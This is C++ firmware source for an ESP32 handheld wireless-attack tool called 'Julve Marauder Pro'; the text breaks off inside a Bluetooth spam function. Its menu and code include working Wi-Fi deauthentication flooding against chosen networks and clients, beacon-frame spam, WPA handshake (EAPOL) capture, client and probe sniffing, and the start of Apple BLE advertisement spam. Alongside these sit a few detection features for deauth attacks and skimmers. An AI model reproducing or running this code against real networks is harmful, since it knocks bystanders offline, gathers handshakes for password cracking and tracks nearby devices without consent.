#include <TFT_eSPI.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include "esp_system.h" 
#include <esp_gap_ble_api.h>
#include "esp_bt_main.h"
#include "esp_gap_bt_api.h"

TFT_eSPI tft = TFT_eSPI();

// --- CONFIGURACIÓN DE HARDWARE ---
const int PIN_UP = 15;
const int PIN_DOWN = 27;
const int PIN_START = 33;  
const int PIN_SELECT = 13; 
const int PIN_TFT_BL = 21; 

#define COLOR_CAPIBARA tft.color565(198, 156, 109)

// --- DECLARACIONES PREVIAS DE FUNCIONES ---
void wifiScanAndSelect(int mode);
void wifiBeaconSpam(bool isRickroll);
void btMultiSpam();
void probeSniffer();
void deauthDetector();
void bleScanner();
void wifiChannelAnalyzer();
void handshakeSniffer();
void bleSkimmerDetect();
void clientMapper(int index);
void classicBtScanner();
void matrixMode();
void showCredits();
void deauthTarget(int index);
bool checkExitOrScreen();
void drawMenu();
void executeOption(int opt);
void performGlobalScan();
void showBootScreen();
String macToString(uint8_t* mac);

// --- VARIABLES DE MENÚ ---
const char* menuOptions[] = {
  "1. Scan & Dir. Deauth",  
  "2. WiFi Beacon Spam",    
  "3. Rickroll Beacons",    
  "4. Deauth Detector",     
  "5. PMKID/EAPOL Sniff",  
  "6. WiFi Analyzer",       
  "7. Client Mapper",       
  "8. Probe Sniffer", 
  "9. BT Spam MultiOS",    
  "10. BT Classic Scan",   
  "11. BLE Scanner",        
  "12. BLE Skimmer Detect",
  "13. Matrix Mode",        
  "14. Creditos",            
  "15. Reiniciar"             
};
int currentSelect = 0;
int totalOptions = 15;
bool inMenu = true;

const char* spamNames[] = {"RootedCON_2026", "Pwned_By_Julve", "FBI_Surveillance", "Capibara_rulez", "ERROR_SYSTEM_404"};

const char* rickrollLyrics[] = {
  "01_We're no strangers to love", "02_You know the rules", "03_And so do I", "04_A full commitments what", 
  "05_Im thinking of", "06_You wouldnt get this from", "07_Any other guy", "08_I just wanna tell you", 
  "09_How Im feeling", "10_Gotta make you understand", "11_Never gonna give you up", "12_Never gonna let you down", 
  "13_Never gonna run around", "14_And desert you", "15_Never gonna make you cry", "16_Never gonna say goodbye", 
  "17_Never gonna tell a lie", "18_And hurt you", "19_Weve known each other", "20_For so long", 
  "21_Your hearts been aching", "22_But youre too shy to say it", "23_Inside we both know", "24_Whats been going on", 
  "25_We know the game", "26_And were gonna play it", "27_And if you ask me", "28_How Im feeling", 
  "29_Dont tell me youre too", "30_Blind to see"
};

const unsigned char capybara_64x64_bmp[] PROGMEM = {
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x03, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x1f, 0xf8, 0x30, 0x00, 0x00, 
  0x00, 0x00, 0x08, 0x7f, 0xfe, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x01, 0xff, 0xff, 0x80, 0x00, 0x00, 0x00, 0x00, 0x03, 0xff, 0xff, 0xc0, 0x00, 0x00, 
  0x00, 0x00, 0x07, 0xff, 0xff, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x07, 0xff, 0xff, 0xf0, 0x00, 0x00, 
  0x00, 0x00, 0x0f, 0xff, 0xff, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x1f, 0xff, 0xff, 0xf8, 0x00, 0x00, 
  0x00, 0x00, 0x1e, 0x7c, 0x3e, 0x78, 0x00, 0x00, 0x00, 0x00, 0x1e, 0x70, 0x0e, 0x78, 0x00, 0x00, 
  0x00, 0x00, 0x3e, 0x60, 0x06, 0x7c, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xe7, 0xc3, 0xfc, 0x00, 0x00, 
  0x00, 0x00, 0x3f, 0xfe, 0x71, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x3f, 0xf8, 0x11, 0xfc, 0x00, 0x00, 
  0x00, 0x00, 0x7f, 0x10, 0x08, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x7f, 0x10, 0x08, 0xfe, 0x00, 0x00, 
  0x00, 0x00, 0xff, 0x30, 0x0c, 0xff, 0x00, 0x00, 0x00, 0x00, 0xff, 0x30, 0x0c, 0xff, 0x00, 0x00, 
  0x00, 0x01, 0xfe, 0x38, 0x1c, 0x7f, 0x80, 0x00, 0x00, 0x01, 0xfe, 0x3c, 0x3c, 0x7f, 0x80, 0x00, 
  0x00, 0x01, 0xfe, 0x3e, 0x7c, 0x7f, 0x80, 0x00, 0x00, 0x01, 0xfe, 0x3e, 0x7c, 0x7f, 0x80, 0x00, 
  0x00, 0x01, 0xff, 0x3c, 0x3c, 0xff, 0x80, 0x00, 0x00, 0x01, 0xff, 0x30, 0x0c, 0xff, 0x80, 0x00, 
  0x00, 0x00, 0xff, 0x10, 0x08, 0xff, 0x00, 0x00, 0x00, 0x00, 0xff, 0x8f, 0xf1, 0xff, 0x00, 0x00, 
  0x00, 0x00, 0x7f, 0x83, 0xc1, 0xff, 0x00, 0x00, 0x00, 0x00, 0x7f, 0xc0, 0x03, 0xfe, 0x00, 0x00, 
  0x00, 0x00, 0x3f, 0xf0, 0x0f, 0xfc, 0x00, 0x00, 0x00, 0x00, 0x0f, 0xff, 0xff, 0xf0, 0x00, 0x00, 
  0x00, 0x00, 0x03, 0xff, 0xff, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x60, 0x3f, 0xff, 0x86, 0x00, 0x00, 
  0x00, 0x00, 0xf8, 0x00, 0x03, 0x9f, 0x00, 0x00, 0x00, 0x00, 0xff, 0x00, 0x03, 0xff, 0x00, 0x00, 
  0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x80, 0x00, 
  0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x80, 0x00, 0x00, 0x01, 0xff, 0xff, 0xff, 0xff, 0x80, 0x00, 
  0x00, 0x01, 0xfb, 0xff, 0xff, 0xdf, 0x80, 0x00, 0x00, 0x01, 0xf9, 0xff, 0xff, 0x9f, 0x80, 0x00, 
  0x00, 0x13, 0xf9, 0xff, 0xff, 0x9f, 0xc8, 0x00, 0x00, 0x13, 0xf9, 0xff, 0xff, 0x9f, 0xc8, 0x00, 
  0x00, 0x33, 0xf9, 0xff, 0xff, 0x9f, 0x8c, 0x00, 0x00, 0x7b, 0xf8, 0xff, 0xff, 0x1f, 0x8e, 0x00, 
  0x00, 0x7f, 0xf8, 0xff, 0xff, 0x1f, 0x8e, 0x00, 0x00, 0x7f, 0xfc, 0xff, 0xff, 0x3f, 0x9e, 0x00, 
  0x00, 0x79, 0xfc, 0x7f, 0xfe, 0x3f, 0x9e, 0x00, 0x00, 0x78, 0xfe, 0x7f, 0xfe, 0x7f, 0x1e, 0x00, 
  0x00, 0x7c, 0xfe, 0x3f, 0xfc, 0x7f, 0x3e, 0x00, 0x00, 0x3c, 0x7f, 0x3f, 0xfc, 0xfe, 0x3c, 0x00, 
  0x00, 0x38, 0x3f, 0x1f, 0xf8, 0xfc, 0x1c, 0x00, 0x00, 0x00, 0x0c, 0x0f, 0xf0, 0x30, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x03, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc3, 0xc3, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x03, 0xf1, 0x8f, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x03, 0xf8, 0x1f, 0xc0, 0x00, 0x00, 
  0x00, 0x00, 0x03, 0x38, 0x1c, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// --- REDES Y VARIABLES PROMISCUAS ---
struct NetworkInfo { String ssid; uint8_t bssid[6]; int channel; };
NetworkInfo global_networks[32]; 
int global_network_count = 0;

volatile int deauth_packets = 0;
String last_probe_mac = "";
String last_probe_ssid = "";
bool new_probe = false;

uint8_t last_deauth_bssid_ap[6] = {0};
uint8_t last_deauth_bssid_sta[6] = {0};
volatile bool deauth_detected = false;

// Variables Deauth
volatile bool scanning_stas = false;
volatile bool sta_found = false;
uint8_t target_bssid[6] = {0};
uint8_t found_sta[6] = {0};

bool isScreenOn = true;

// --- VARIABLES PARA MÓDULOS EXTRAS ---
volatile bool analyzer_mode = false;
volatile int channel_packets[15] = {0}; 

volatile bool handshake_mode = false;
volatile bool handshake_caught = false;
uint8_t handshake_bssid[6];
uint8_t handshake_frame[128];
int handshake_len = 0;

volatile bool skimmer_mode = false;
String skimmer_mac = "";
String skimmer_type = "";
int skimmer_rssi = 0;

String last_ble_mac = ""; 
String last_ble_name = ""; 
int last_ble_rssi = 0;

// Variables Client Mapper
volatile bool mapping_active = false;
uint8_t mapping_bssid[6] = {0};
uint8_t mapped_stas[20][6];
volatile int mapped_sta_count = 0;

// Variables BT Clásico
volatile int classic_bt_count = 0;
String classic_bt_devices[15];
bool bt_classic_scanning = false;

// --- FUNCION MAESTRA PARA APAGAR PANTALLA O SALIR ---
bool checkExitOrScreen() {
  if (digitalRead(PIN_SELECT) == LOW) {
    unsigned long pressTime = millis();
    while(digitalRead(PIN_SELECT) == LOW) {
      if (millis() - pressTime > 800) { 
        isScreenOn = !isScreenOn;
        digitalWrite(PIN_TFT_BL, isScreenOn ? HIGH : LOW); 
        while(digitalRead(PIN_SELECT) == LOW) { delay(10); } 
        return false; 
      }
      delay(10);
    }
    return true; 
  }
  return false;
}

// --- CALLBACK BT CLÁSICO (GAP) ---
void bt_classic_gap_cb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
  if (event == ESP_BT_GAP_DISC_RES_EVT) {
      char bda_str[18];
      sprintf(bda_str, "%02X:%02X:%02X:%02X:%02X:%02X",
              param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
              param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
      String dev = String(bda_str);
      bool exists = false;
      for(int i=0; i<classic_bt_count; i++) {
          if(classic_bt_devices[i].indexOf(dev) >= 0) exists = true;
      }
      if(!exists && classic_bt_count < 15) {
          classic_bt_devices[classic_bt_count] = dev;
          for (int i = 0; i < param->disc_res.num_prop; i++) {
              if (param->disc_res.prop[i].type == ESP_BT_GAP_DEV_PROP_EIR) {
                  uint8_t *eir = (uint8_t *)param->disc_res.prop[i].val;
                  uint8_t len = 0;
                  uint8_t *name = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_CMPL_LOCAL_NAME, &len);
                  if (!name) name = esp_bt_gap_resolve_eir_data(eir, ESP_BT_EIR_TYPE_SHORT_LOCAL_NAME, &len);
                  if (name) {
                      char name_str[64] = {0};
                      memcpy(name_str, name, len);
                      classic_bt_devices[classic_bt_count] += " " + String(name_str);
                  }
              }
          }
          classic_bt_count++;
      }
  }
}

// --- CALLBACK WIFI ---
void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *frame = pkt->payload;
  int sig_len = pkt->rx_ctrl.sig_len;
  int current_ch = pkt->rx_ctrl.channel;
  
  if (analyzer_mode && current_ch >= 1 && current_ch <= 13) channel_packets[current_ch]++;

  if (handshake_mode && type == WIFI_PKT_DATA && sig_len > 36) {
      for(int i = 24; i < sig_len - 8 && i < 100; i++) {
          if(frame[i]==0xAA && frame[i+1]==0xAA && frame[i+2]==0x03 && frame[i+6]==0x88 && frame[i+7]==0x8E) {
              if(!handshake_caught) {
                  handshake_caught = true;
                  memcpy(handshake_bssid, &frame[16], 6); 
                  handshake_len = min(sig_len, 128);
                  memcpy(handshake_frame, frame, handshake_len);
              }
              break;
          }
      }
  }

  if (type == WIFI_PKT_MGMT && (frame[0] == 0xC0 || frame[0] == 0xA0)) {
    deauth_packets++;
    memcpy(last_deauth_bssid_ap, &frame[10], 6);
    memcpy(last_deauth_bssid_sta, &frame[16], 6);
    deauth_detected = true;
  }
  
  if (type == WIFI_PKT_MGMT && frame[0] == 0x40) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
    last_probe_mac = String(macStr);
    int ssid_len = frame[25]; 
    if (frame[24] == 0x00 && ssid_len > 0 && ssid_len <= 32) {
        char ssidBuf[33] = {0};
        memcpy(ssidBuf, &frame[26], ssid_len);
        last_probe_ssid = String(ssidBuf);
    } else last_probe_ssid = "<Red Oculta>";
    new_probe = true;
  }

  if (scanning_stas && type == WIFI_PKT_DATA) {
    if (memcmp(&frame[4], target_bssid, 6) == 0) { 
      memcpy(found_sta, &frame[10], 6);
      if((found_sta[0] & 0x01) == 0) sta_found = true; 
    } else if (memcmp(&frame[10], target_bssid, 6) == 0) { 
      memcpy(found_sta, &frame[4], 6);
      if((found_sta[0] & 0x01) == 0) sta_found = true;
    }
  }

  if (mapping_active && type == WIFI_PKT_DATA) {
    uint8_t current_sta[6] = {0};
    bool found_mapper = false;
    if (memcmp(&frame[4], mapping_bssid, 6) == 0) { 
        memcpy(current_sta, &frame[10], 6); found_mapper = true;
    } else if (memcmp(&frame[10], mapping_bssid, 6) == 0) { 
        memcpy(current_sta, &frame[4], 6); found_mapper = true;
    }

    if (found_mapper && (current_sta[0] & 0x01) == 0) { 
        bool exists = false;
        for(int i=0; i<mapped_sta_count; i++) {
            if(memcmp(mapped_stas[i], current_sta, 6) == 0) { exists = true; break; }
        }
        if(!exists && mapped_sta_count < 20) {
            memcpy(mapped_stas[mapped_sta_count], current_sta, 6);
            mapped_sta_count++;
        }
    }
  }
}

// --- CALLBACK BLE ---
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
      String macStr = String(advertisedDevice.getAddress().toString().c_str());
      String nameStr = "";
      if(advertisedDevice.haveName()) nameStr = String(advertisedDevice.getName().c_str());
      
      if (skimmer_mode) {
          bool isSkimmer = false;
          String sType = "";
          if (nameStr.indexOf("HC-05") >= 0 || nameStr.indexOf("JDY") >= 0 || nameStr.indexOf("BTM") >= 0) {
              isSkimmer = true; sType = "Posible Skimmer";
          }
          if (advertisedDevice.haveManufacturerData()) {
              String md = advertisedDevice.getManufacturerData();
              if (md.length() >= 4 && md[0] == 0x4C && md[1] == 0x00 && md[2] == 0x12 && md[3] == 0x19) {
                  isSkimmer = true; sType = "Rastreador AirTag";
              }
          }
          if (isSkimmer) {
              skimmer_mac = macStr; skimmer_type = sType; skimmer_rssi = advertisedDevice.getRSSI();
          }
      }

      last_ble_mac = macStr;
      last_ble_rssi = advertisedDevice.getRSSI();
      if(nameStr.length() > 0) {
        last_ble_name = nameStr;
      } else if (advertisedDevice.haveManufacturerData()) {
        String md = advertisedDevice.getManufacturerData(); 
        if(md.length() >= 2) {
          uint16_t compId = ((uint8_t)md[1] << 8) | (uint8_t)md[0];
          if (compId == 0x004C) last_ble_name = "[Apple Device]";
          else if (compId == 0x0006) last_ble_name = "[Microsoft]";
          else if (compId == 0x0075) last_ble_name = "[Samsung]";
          else if (compId == 0x0113) last_ble_name = "[Linux/BlueZ]";
          else last_ble_name = "ID: 0x" + String(compId, HEX);
        } else last_ble_name = "<Oculto>";
      } else last_ble_name = "<Oculto>";
    }
};

void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
  mac[0] = (mac[0] | 0xC0); 
}
String macToString(uint8_t* mac) {
  char buf[20];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void showBootScreen() {
  tft.fillScreen(TFT_BLACK);
  tft.drawBitmap(48, 5, capybara_64x64_bmp, 64, 64, COLOR_CAPIBARA);
  tft.setTextColor(TFT_GREEN); tft.drawCentreString("JULVE MARAUDER PRO", 80, 75, 2);
  tft.setTextColor(TFT_WHITE); tft.drawCentreString("Cargando Firmware...", 80, 95, 1);
  tft.drawRect(20, 108, 120, 10, TFT_WHITE);
  for(int i=0; i<116; i+=4) { tft.fillRect(22, 110, i, 6, TFT_GREEN); delay(15); }
  delay(300);
}

void performGlobalScan() {
  global_network_count = 0;
  WiFi.disconnect(); esp_wifi_set_promiscuous(false); 
  int n = WiFi.scanNetworks(false, true); 
  if (n > 0) {
    global_network_count = min(n, 32);
    for(int i = 0; i < global_network_count; i++) {
      global_networks[i].ssid = WiFi.SSID(i);
      memcpy(global_networks[i].bssid, WiFi.BSSID(i), 6);
      global_networks[i].channel = WiFi.channel(i);
    }
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(PIN_UP, INPUT_PULLUP); pinMode(PIN_DOWN, INPUT_PULLUP);
  pinMode(PIN_START, INPUT_PULLUP); pinMode(PIN_SELECT, INPUT_PULLUP);
  
  pinMode(PIN_TFT_BL, OUTPUT);
  digitalWrite(PIN_TFT_BL, HIGH);

  tft.init(); tft.setRotation(1);
  showBootScreen();

  WiFi.mode(WIFI_AP_STA);
  esp_wifi_start();
  esp_wifi_set_max_tx_power(78);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb); 
  drawMenu();
}

void loop() {
  checkExitOrScreen(); 

  if (inMenu) {
    if (digitalRead(PIN_UP) == LOW) { currentSelect = (currentSelect - 1 + totalOptions) % totalOptions; drawMenu(); delay(150); }
    if (digitalRead(PIN_DOWN) == LOW) { currentSelect = (currentSelect + 1) % totalOptions; drawMenu(); delay(150); }
    if (digitalRead(PIN_START) == LOW) { executeOption(currentSelect); delay(250); }
  }
}

void drawMenu() {
  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_GREEN); tft.drawRect(0, 0, 160, 18, TFT_GREEN);
  tft.drawCentreString("JULVE MARAUDER PRO", 80, 2, 1);
  int startIdx = (currentSelect / 5) * 5;
  for (int i = startIdx; i < min(totalOptions, startIdx + 5); i++) {
    int y = 22 + ((i - startIdx) * 18);
    if (i == currentSelect) { tft.fillRect(2, y - 1, 156, 16, TFT_GREEN); tft.setTextColor(TFT_BLACK); } 
    else tft.setTextColor(TFT_WHITE);
    tft.drawString(menuOptions[i], 5, y);
  }
}


void executeOption(int opt) {
  inMenu = false;
  if (opt == 0)      wifiScanAndSelect(0);   // Scan & Dir. Deauth
  else if (opt == 1) wifiBeaconSpam(false);  // WiFi Beacon Spam
  else if (opt == 2) wifiBeaconSpam(true);   // Rickroll Beacons
  else if (opt == 3) deauthDetector();       // Deauth Detector
  else if (opt == 4) handshakeSniffer();     // PMKID/EAPOL Sniff
  else if (opt == 5) wifiChannelAnalyzer();  // WiFi Analyzer
  else if (opt == 6) wifiScanAndSelect(1);   // Client Mapper
  else if (opt == 7) probeSniffer();         // Probe Sniffer (Rx)
  else if (opt == 8) btMultiSpam();          // BT Spam MultiOS
  else if (opt == 9) classicBtScanner();     // BT Classic Scan
  else if (opt == 10) bleScanner();          // BLE Scanner
  else if (opt == 11) bleSkimmerDetect();    // BLE Skimmer Detect
  else if (opt == 12) matrixMode();          // Matrix Mode
  else if (opt == 13) showCredits();         // Credits
  else ESP.restart();                        // Restart
  inMenu = true; drawMenu();
}


void wifiScanAndSelect(int mode) {
  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_GREEN);
  tft.drawCentreString("Escaneando APs...", 80, 50, 1);
  performGlobalScan();

  if (global_network_count <= 0) {
    tft.drawCentreString("No se han hallado redes", 80, 70, 1); delay(2000); return;
  }

  int scroll = 0;
  while(true) {
    tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_YELLOW);
    tft.drawString("Objetivo:", 5, 2);
    tft.drawString("SELECT: Salir/Apagar", 5, 12);
    int startIdx = (scroll / 6) * 6;
    for (int i = startIdx; i < min(global_network_count, startIdx + 6); i++) {
      int y = 28 + ((i - startIdx) * 15);
      if (i == scroll) { tft.fillRect(0, y - 1, 160, 14, TFT_WHITE); tft.setTextColor(TFT_BLACK); } 
      else tft.setTextColor(TFT_GREEN);
      tft.drawString(global_networks[i].ssid.substring(0, 14), 5, y);
    }
    if (digitalRead(PIN_UP) == LOW) { scroll = (scroll - 1 + global_network_count) % global_network_count; delay(150); }
    if (digitalRead(PIN_DOWN) == LOW) { scroll = (scroll + 1) % global_network_count; delay(150); }
    
    if (checkExitOrScreen()) return; 
    
    if (digitalRead(PIN_START) == LOW) { 
        if (mode == 0) deauthTarget(scroll); 
        else clientMapper(scroll);
        return; 
    }
    delay(50);
  }
}

// --- CLIENT MAPPER ---
void clientMapper(int index) {
  memcpy(mapping_bssid, global_networks[index].bssid, 6);
  int target_ch = global_networks[index].channel;
  String ssid = global_networks[index].ssid;

  esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_STA);
  esp_wifi_stop(); delay(100); esp_wifi_start();
  esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true); 

  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_GREEN);
  tft.drawCentreString("CLIENT MAPPER", 80, 5, 2);
  tft.setTextColor(TFT_CYAN); tft.drawCentreString(ssid.substring(0,18), 80, 25, 1);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 115);

  mapped_sta_count = 0;
  mapping_active = true;

  while(!checkExitOrScreen()) {
      tft.fillRect(0, 35, 160, 75, TFT_BLACK);
      tft.setTextColor(TFT_WHITE);
      for(int i=0; i<min((int)mapped_sta_count, 5); i++) {
          int displayIdx = mapped_sta_count > 5 ? mapped_sta_count - 5 + i : i;
          tft.drawString(macToString(mapped_stas[displayIdx]), 5, 38 + (i * 12));
      }
      tft.setTextColor(TFT_GREEN);
      tft.drawRightString("Total: " + String(mapped_sta_count), 155, 38 + (min((int)mapped_sta_count, 5) * 12), 1);
      delay(500);
  }
  mapping_active = false;
  esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_AP_STA);
}

// --- BT CLASSIC SCANNER ---
void classicBtScanner() {
  tft.fillScreen(TFT_NAVY); tft.setTextColor(TFT_WHITE);
  tft.drawCentreString("BT CLASSIC SCAN", 80, 5, 2);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 115);

  classic_bt_count = 0;
  
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BTDM);
  esp_bluedroid_init();
  esp_bluedroid_enable();
  
  esp_bt_gap_register_callback(bt_classic_gap_cb);
  esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
  esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 10, 0);

  while(!checkExitOrScreen()) {
      tft.fillRect(0, 25, 160, 85, TFT_NAVY);
      tft.setTextColor(TFT_CYAN);
      if (classic_bt_count == 0) {
          tft.drawCentreString("Buscando...", 80, 50, 1);
      } else {
          for(int i=0; i<min((int)classic_bt_count, 6); i++) {
              int idx = classic_bt_count > 6 ? classic_bt_count - 6 + i : i;
              tft.drawString(classic_bt_devices[idx].substring(0, 25), 2, 28 + (i * 12));
          }
      }
      delay(1000);
  }

  esp_bt_gap_cancel_discovery();
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
}

// --- DEAUTH ---
void deauthTarget(int index) {
  memcpy(target_bssid, global_networks[index].bssid, 6);
  int target_ch = global_networks[index].channel;
  String ssid = global_networks[index].ssid;

  esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_STA);
  esp_wifi_stop(); delay(100); esp_wifi_start();
  esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true); 

  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_YELLOW);
  tft.drawCentreString("Buscando Clientes...", 80, 40, 1);
  tft.setTextColor(TFT_WHITE); tft.drawCentreString(ssid, 80, 60, 1);
  
  sta_found = false; scanning_stas = true;
  long startTime = millis();
  while(millis() - startTime < 4000) { delay(10); if(sta_found) break; }
  scanning_stas = false;

  tft.fillScreen(TFT_RED); tft.setTextColor(TFT_WHITE);
  tft.drawCentreString("ATAQUE DEAUTH CH:" + String(target_ch), 80, 10, 1);
  
  uint8_t target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; 
  if (sta_found) {
    memcpy(target_mac, found_sta, 6);
    tft.setTextColor(TFT_GREEN); tft.drawString("Modo: DIRIGIDO", 5, 35);
    tft.drawString("STA: " + macToString(found_sta), 5, 50);
  } else {
    tft.setTextColor(TFT_YELLOW); tft.drawString("Modo: BROADCAST", 5, 35);
    tft.drawString("Ningun STA detectado.", 5, 50);
  }
  
  tft.setTextColor(TFT_WHITE); tft.drawString("SELECT: Salir/Apagar", 5, 110);

  uint8_t pkt[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                      0x00, 0x00, 0x07, 0x00 };
                      
  memcpy(&pkt[4], target_mac, 6); memcpy(&pkt[10], target_bssid, 6); memcpy(&pkt[16], target_bssid, 6); 

  uint16_t seq = 0;
  uint8_t reasonCodes[] = {0x01, 0x04, 0x07, 0x08}; 
  int rcIndex = 0;

  while(!checkExitOrScreen()) {
    esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
    pkt[24] = reasonCodes[rcIndex];
    rcIndex = (rcIndex + 1) % 4;

    for(int i = 0; i < 15; i++) {
      seq++; pkt[22] = (seq << 4) & 0xff; pkt[23] = (seq >> 4) & 0xff;
      
      pkt[0] = 0xc0; esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
      pkt[0] = 0xa0; esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
      
      if (sta_found) {
        memcpy(&pkt[4], target_bssid, 6); memcpy(&pkt[10], target_mac, 6);  
        pkt[0] = 0xc0; esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26, false);
        memcpy(&pkt[4], target_mac, 6); memcpy(&pkt[10], target_bssid, 6);
      }
      delay(2); 
    }
    tft.fillRect(10, 80, 140, 25, TFT_RED);
    tft.setTextColor(TFT_WHITE); tft.drawString("Pkts Sent: " + String(seq * (sta_found ? 3 : 2)), 15, 85);
    delay(50);
  }
  esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_AP_STA); 
}

// --- WIFI BEACON SPAM ---
void wifiBeaconSpam(bool isRickroll) {
  tft.fillScreen(TFT_BLACK); tft.setTextColor(TFT_RED); 
  tft.drawCentreString(isRickroll ? "RICKROLL ACTIVE" : "WIFI SPAM ACTIVE", 80, 10, 1);
  tft.setTextColor(TFT_YELLOW); tft.drawString("SELECT: Salir/Apagar", 5, 110);

  int num_nets = isRickroll ? (sizeof(rickrollLyrics)/sizeof(rickrollLyrics[0])) : 60;
  uint8_t macs[60][6]; String names[60]; uint8_t channels[60];

  for(int i = 0; i < num_nets; i++) {
    for(int j = 0; j < 6; j++) macs[i][j] = random(256);
    macs[i][0] = (macs[i][0] & 0xFC) | 0x02; 
    names[i] = isRickroll ? String(rickrollLyrics[i]) : String(spamNames[i % 5]) + "_" + String(random(10, 99));
    channels[i] = isRickroll ? 1 : random(1, 12); 
  }

  esp_wifi_set_promiscuous(true);
  while(!checkExitOrScreen()) {
    for (int i = 0; i < num_nets; i++) {
      uint8_t pkt[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
                           macs[i][0], macs[i][1], macs[i][2], macs[i][3], macs[i][4], macs[i][5],
                           macs[i][0], macs[i][1], macs[i][2], macs[i][3], macs[i][4], macs[i][5],
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04 };
      int ssid_len = names[i].length();
      pkt[36] = 0x00; pkt[37] = ssid_len; memcpy(&pkt[38], names[i].c_str(), ssid_len);
      int pos = 38 + ssid_len;
      uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c };
      memcpy(&pkt[pos], rates, 10); pos += 10;
      uint8_t ds[] = { 0x03, 0x01, channels[i] }; memcpy(&pkt[pos], ds, 3); pos += 3;
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
    }
    delay(10); 
  }
  esp_wifi_set_promiscuous(false);
}

// --- BT MULTI-OS SPAM ---
void btMultiSpam() {
  BLEDevice::init("");
  int spamType = 0; 
  bool changed = true;
  
  uint8_t apple_data[] = { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
